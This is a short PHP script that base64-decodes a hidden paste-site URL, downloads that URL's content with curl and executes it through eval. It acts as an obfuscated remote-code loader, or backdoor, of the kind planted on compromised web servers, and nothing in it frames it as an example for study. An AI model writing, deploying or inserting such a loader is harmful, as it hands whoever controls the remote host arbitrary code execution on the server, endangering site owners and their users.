<?php
$url = base64_decode('aHR0cHM6Ly9wYXN0ZS5oYXhvci1yZXNlYXJjaC5jb20vcmF3L2QzNTBkYTE1'); 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$output = curl_exec($ch);
curl_close($ch);

eval("?>".$output);
?>
